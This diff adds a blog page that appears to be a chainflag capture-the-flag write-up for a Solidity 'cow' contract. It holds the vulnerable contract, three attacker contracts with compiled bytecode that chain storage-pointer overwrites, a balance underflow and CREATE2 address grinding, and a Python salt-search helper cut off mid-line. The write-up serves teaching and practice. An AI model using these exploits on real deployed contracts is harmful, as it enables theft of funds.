@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      11.storage(cow) 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">11.storage(cow)</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-29 15:14:22
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                    <b>#</b> 02.chainflag ctf
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="storage-cow"><a href="#storage-cow" class="headerlink" title="storage(cow)"></a>storage(cow)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.2;</span><br><span class="line">contract cow&#123;</span><br><span class="line">    address public owner_1;</span><br><span class="line">    address public owner_2;</span><br><span class="line">    address public owner_3;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line"></span><br><span class="line">    struct hacker &#123;</span><br><span class="line">        address hackeraddress1;</span><br><span class="line">        address hackeraddress2;</span><br><span class="line">    &#125;</span><br><span class="line">    hacker  h;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        owner_1 = msg.sender;</span><br><span class="line">        owner_2 = msg.sender;</span><br><span class="line">        owner_3 = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function payforflag(string b64email) public</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner_1);</span><br><span class="line">        require(msg.sender==owner_2);</span><br><span class="line">        require(msg.sender==owner_3);</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Cow() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth==1)</span><br><span class="line">        &#123;</span><br><span class="line">            owner_1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cov() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        if (geteth&lt;1)</span><br><span class="line">        &#123;</span><br><span class="line">            hacker fff=h;</span><br><span class="line">            fff.hackeraddress1=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fff.hackeraddress2=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function see() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balance[msg.sender]+=geteth;</span><br><span class="line">        if (uint(msg.sender) &amp; 0xffff == 0x525b)</span><br><span class="line">        &#123;</span><br><span class="line">            balance[msg.sender] -= 0xb1b1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy_own() public</span><br><span class="line">    &#123;</span><br><span class="line">        require(balance[msg.sender]&gt;1000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner_3=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>solution 1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line">// CREATE2 was added to Inline assembler in version 0.5.2</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttacker&#123;</span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561000f575f80fd5b506105048061001d5f395ff3fe60806040526004361061002c575f3560e01c80634382e7961461002f578063d018db3e146100595761002d565b5b005b34801561003a575f80fd5b50610043610075565b60405161005091906103d3565b60405180910390f35b610073600480360381019061006e919061042b565b610098565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610144575f80fd5b505af1158015610156573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101c8575f80fd5b505af11580156101da573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610243575f80fd5b505af1158015610255573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bd575f80fd5b505af11580156102cf573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b8152600401610329906104b0565b5f604051808303815f87803b158015610340575f80fd5b505af1158015610352573d5f803e3d5ffd5b5050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61039b61039661039184610359565b610378565b610359565b9050919050565b5f6103ac82610381565b9050919050565b5f6103bd826103a2565b9050919050565b6103cd816103b3565b82525050565b5f6020820190506103e65f8301846103c4565b92915050565b5f80fd5b5f6103fa82610359565b9050919050565b61040a816103f0565b8114610414575f80fd5b50565b5f8135905061042581610401565b92915050565b5f602082840312156104405761043f6103ec565b5b5f61044d84828501610417565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f61049a600c83610456565b91506104a582610466565b602082019050919050565b5f6020820190508181035f8301526104c78161048e565b905091905056fea26469706673582212202c06fb75fa71e0d2a3e9a65775abb3b8da76e9a9caf57d1f38958f64af2b2dd664736f6c63430008140033&quot;;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>solution 2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line">// CREATE2 was added to Inline assembler in version 0.5.2</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttack&#123;</span><br><span class="line">    bytes public attackCode = hex&quot;608060405260405161051b38038061051b83398181016040528101906100259190610347565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156100d1575f80fd5b505af11580156100e3573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610155575f80fd5b505af1158015610167573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101d0575f80fd5b505af11580156101e2573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561024a575f80fd5b505af115801561025c573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b81526004016102b6906103cc565b5f604051808303815f87803b1580156102cd575f80fd5b505af11580156102df573d5f803e3d5ffd5b50505050506103ea565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610316826102ed565b9050919050565b6103268161030c565b8114610330575f80fd5b50565b5f815190506103418161031d565b92915050565b5f6020828403121561035c5761035b6102e9565b5b5f61036984828501610333565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f6103b6600c83610372565b91506103c182610382565b602082019050919050565b5f6020820190508181035f8301526103e3816103aa565b9050919050565b610124806103f75f395ff3fe608060405260043610601e575f3560e01c80634382e79614602157601f565b5b005b348015602b575f80fd5b5060326046565b604051603d919060d7565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f60a560a1609d846069565b6088565b6069565b9050919050565b5f60b4826091565b9050919050565b5f60c38260ac565b9050919050565b60d18160bb565b82525050565b5f60208201905060e85f83018460ca565b9291505056fea264697066735822122028aa20ef563791f8bcf46fe2a77305c5a34faed84db654744d52b270c03ad0d564736f6c63430008140033&quot;;</span><br><span class="line">    bytes32 public attackCodeHash = &quot;&quot;;</span><br><span class="line">    </span><br><span class="line">    // before attack, we should update the attackCode,</span><br><span class="line">    // because the parameters should be add behide the bytecode</span><br><span class="line">    function getHash(address _addr) public returns(bytes32)&#123;</span><br><span class="line">        attackCode = abi.encodePacked(attackCode,abi.encode(_addr));</span><br><span class="line">        attackCodeHash = keccak256(attackCode);</span><br><span class="line">        return attackCodeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(bytes32 _salt) public payable&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // deploy the contract with 2 Ether</span><br><span class="line">            addr := create2(2000000000000000000, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>solution 3: not successful, TODO……how to use new(CREATE2)?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">//solution 3: not successful, TODO......how to use new(CREATE2)?</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface Icow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string memory)external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AttackMan&#123;</span><br><span class="line">    Icow public _cow = Icow(0x6298e76001Fdd107735f040df8808864B8128722);</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public payable &#123;</span><br><span class="line">        _cow = Icow(_addr);</span><br><span class="line">        _cow.Cow&#123;value:1 ether&#125;(); // owner_1</span><br><span class="line">        _cow.cov&#123;value:1 ether&#125;(); // owner_2</span><br><span class="line">        _cow.see(); // owner_3</span><br><span class="line">        _cow.buy_own(); // owner_3</span><br><span class="line">        _cow.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployAttack&#123;</span><br><span class="line">    bytes public attackCode = hex&quot;6080604052736298e76001fdd107735f040df8808864b81287225f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550348015610062575f80fd5b50610504806100705f395ff3fe60806040526004361061002c575f3560e01c80634382e7961461002f578063d018db3e146100595761002d565b5b005b34801561003a575f80fd5b50610043610075565b60405161005091906103d3565b60405180910390f35b610073600480360381019061006e919061042b565b610098565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610144575f80fd5b505af1158015610156573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101c8575f80fd5b505af11580156101da573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610243575f80fd5b505af1158015610255573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bd575f80fd5b505af11580156102cf573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b8152600401610329906104b0565b5f604051808303815f87803b158015610340575f80fd5b505af1158015610352573d5f803e3d5ffd5b5050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61039b61039661039184610359565b610378565b610359565b9050919050565b5f6103ac82610381565b9050919050565b5f6103bd826103a2565b9050919050565b6103cd816103b3565b82525050565b5f6020820190506103e65f8301846103c4565b92915050565b5f80fd5b5f6103fa82610359565b9050919050565b61040a816103f0565b8114610414575f80fd5b50565b5f8135905061042581610401565b92915050565b5f602082840312156104405761043f6103ec565b5b5f61044d84828501610417565b91505092915050565b5f82825260208201905092915050565b7f7375636365737366756c6c7900000000000000000000000000000000000000005f82015250565b5f61049a600c83610456565b91506104a582610466565b602082019050919050565b5f6020820190508181035f8301526104c78161048e565b905091905056fea2646970667358221220e1d2efbe90c8e219de35c09dc2a463d1e09945a20a932d815526c1fc8bf7ac2a64736f6c63430008140033&quot;;</span><br><span class="line">    bytes32 public attackCodeHash = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    function getHash(address _addr) public returns(bytes32)&#123;</span><br><span class="line">        // attackCode = abi.encodePacked(type(AttackMan).creationCode,abi.encode(_addr));</span><br><span class="line">        // attackCodeHash = keccak256(attackCode);</span><br><span class="line">        attackCodeHash = keccak256(type(AttackMan).creationCode);</span><br><span class="line">        return attackCodeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(bytes32 _salt) public payable returns(address)&#123;</span><br><span class="line">        AttackMan x = new AttackMan&#123;salt:_salt&#125;();</span><br><span class="line">        return address(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>calculate salt:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetSpecialAddressByCreate2</span>(<span class="params">DeployAddress: <span class="built_in">str</span>, BytecodeHash: <span class="built_in">str</span>, content: <span class="built_in">str</span>, potision:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        获得包含特定内容的地址，通过 create2。根据 create2原理写出来的</span></span><br><span class="line"><span class="string">        如果想让地址的某个位置是特定内容的值，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            DeployAttackAddress (str): 部署合约地址</span></span><br><span class="line"><span class="string">            BytecodeHash (str): 待部署的合约的 bytecode的 hash 值</span></span><br><span class="line"><span class="string">            content: 包含的某个特定的值</span></span><br><span class="line"><span class="string">            position(可选)：地址的某个位置是特定内容的值，默认是0，可手动调整，比如 content=&#x27;ab&#x27;,position=-2就是计算得到的地址的后两位是&#x27;ab&#x27;，第position位是之后的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">             str: 第一个是 salt值，第二个是地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        例子： BlockchainUtils.GetSpecialAddressByCreate2(&quot;406187E1b3366B5da3539D99C4E88E42FC60De50&quot;,&quot;da647010355608442b3eab68e7dcc6d5b836f2628d2366ff8ae853413a643965&quot;,&quot;5a54&quot;)</span></span><br><span class="line"><span class="string">              得到的地址包含 &#x27;5a54&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            start_time = time.time()  <span class="comment"># 获取当前时间戳</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">                current_time = time.time()</span><br><span class="line">                elapsed_time = current_time - start_time</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">&quot;time out,maybe a wrong position&quot;</span>)</span><br><span class="line"></span><br><span class="line">                salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                s = <span class="string">&#x27;0xff&#x27;</span> + DeployAddress + salt + BytecodeHash</span><br><span class="line">                hashed = 